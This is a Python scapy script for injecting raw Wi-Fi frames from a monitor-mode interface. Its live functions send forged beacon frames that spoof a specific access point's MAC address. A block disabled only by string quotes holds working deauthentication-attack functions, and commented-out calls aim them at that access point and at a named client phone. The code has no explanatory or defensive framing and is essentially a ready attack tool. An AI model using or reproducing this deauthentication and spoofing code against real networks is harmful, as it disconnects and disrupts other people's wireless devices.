import time

from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11Deauth, Dot11, Dot11Beacon, Dot11Elt

interface_name: str = "mon0"

BROADCAST_MAC: str = "FF:FF:FF:FF:FF:FF"
TEST_MAC: str = "01:01:01:01:01:01"

AP_V4_1FLOOR_MAC: str = 'F6:8C:EB:27:6C:AA'
client_xiaomi_note2: str = '18:F0:E4:1F:B2:84'

DEFAULT_SEND_INTERVAL: float = 0.1


class JamSetting(object):

    def __init__(self,
                 channel: int,
                 power: int,
                 period: int,
                 length: int,
                 timestamp=datetime.now()):
        self.channel: int = channel
        self.power: int = power
        self.period: int = period
        self.length: int = length
        self.timestamp: datetime = timestamp


def send_test_packet(client_mac: str,
                     access_point_mac: str,
                     count: int = 3,
                     interface: str = interface_name):
    pkt = RadioTap() / \
          Dot11(addr1=client_mac, addr2=access_point_mac, addr3=access_point_mac) / \
          Dot11Beacon(cap="ESS", timestamp=1) / \
          Dot11Elt(ID="SSID", info="GGG_WIFI_TEST") / \
          Dot11Elt(ID="Rates", info='\x82\x84\x0b\x16') / \
          Dot11Elt(ID="DSset", info="\x03") / \
          Dot11Elt(ID="TIM", info="\x00\x01\x00\x00")

    return sendp(pkt, iface=interface, count=count, inter=DEFAULT_SEND_INTERVAL)


def send_test_packet_ex(client_mac: str,
                        access_point_mac: str,
                        count: int = 3,
                        interface: str = interface_name):

    config: JamSetting = JamSetting(channel=5, power=70, period=1, length=128)

    radio = RadioTap(present='Flags+Rate+Channel+dBm_AntSignal+Antenna')
    radio.Rate = 2
    radio.Channel = config.channel
    radio.dBm_AntSignal = -1 * int(config.power)

    pkt = radio / \
          Dot11(addr1=client_mac, addr2=access_point_mac, addr3=access_point_mac) / \
          Dot11Beacon(cap="ESS", timestamp=1) / \
          Dot11Elt(ID="SSID", info="GGG_WIFI_TEST") / \
          Dot11Elt(ID="Rates", info='\x82\x84\x0b\x16') / \
          Dot11Elt(ID="DSset", info="\x03") / \
          Dot11Elt(ID="TIM", info="\x00\x01\x00\x00")

    return sendp(pkt, iface=interface, count=count, inter=DEFAULT_SEND_INTERVAL)


def send_test_packet_sock(client_mac: str,
                          access_point_mac: str,
                          count: int = 3,
                          interface: str = interface_name):

    config: JamSetting = JamSetting(channel=5, power=71, period=1, length=128)

    radio = RadioTap(present='Flags+Rate+Channel+dBm_AntSignal+Antenna')
    radio.Rate = 2
    radio.Channel = config.channel
    radio.dBm_AntSignal = -1 * int(config.power)

    pkt = radio / \
          Dot11(addr1=client_mac, addr2=access_point_mac, addr3=access_point_mac) / \
          Dot11Beacon(cap="ESS", timestamp=1) / \
          Dot11Elt(ID="SSID", info="GGG_WIFI_TEST") / \
          Dot11Elt(ID="Rates", info='\x82\x84\x0b\x16') / \
          Dot11Elt(ID="DSset", info="\x03") / \
          Dot11Elt(ID="TIM", info="\x00\x01\x00\x00")

    packet_prepared = pkt.build()
    sock = conf.L2socket(iface=interface)
    for _ in range(count):
        sock.send(packet_prepared)
        time.sleep(DEFAULT_SEND_INTERVAL)

    sock.close()

'''
def deauth(client_mac: str,
           access_point_mac: str,
           count: int = 3,
           interface: str = interface_name):
    pkt: Any = RadioTap() / Dot11(addr1=client_mac, addr2=access_point_mac, addr3=access_point_mac) / Dot11Deauth()
    return sendp(pkt, iface=interface, count=int(count), inter=0.2)


def deauth_ex(client_mac: str,
              access_point_mac: str,
              count: int = 3,
              interface: str = interface_name):
    config: JamSetting = JamSetting(channel=7, power=50, period=1, length=128)

    radio = RadioTap(present='Flags+Rate+Channel+dBm_AntSignal+Antenna')
    radio.Rate = 2
    radio.Channel = config.channel
    radio.dBm_AntSignal = -1 * int(config.power)

    pkt: Any = radio / Dot11(addr1=client_mac, addr2=access_point_mac, addr3=access_point_mac) / Dot11Deauth()
    return sendp(pkt, iface=interface, count=int(count), inter=0.2)

'''

if __name__ == "__main__":
    # deauth(client_mac="01:01:01:01:01:01", access_point_mac=AP_V4_1FLOOR_MAC)
    # deauth(client_mac=client_xiaomi_note2, access_point_mac=AP_V4_1FLOOR_MAC)

    # deauth_ex(client_mac=client_xiaomi_note2, access_point_mac=AP_V4_1FLOOR_MAC)

    # deauth(client_mac="01:01:01:01:01:01", access_point_mac=AP_V4_1FLOOR_MAC)
    # deauth_ex(client_mac="01:01:01:01:01:01", access_point_mac=AP_V4_1FLOOR_MAC)

    # send_test_packet(client_mac=TEST_MAC, access_point_mac=AP_V4_1FLOOR_MAC)
    # send_test_packet_ex(client_mac=TEST_MAC, access_point_mac=AP_V4_1FLOOR_MAC)
    send_test_packet_sock(client_mac=TEST_MAC, access_point_mac=AP_V4_1FLOOR_MAC, count=10)

    pass
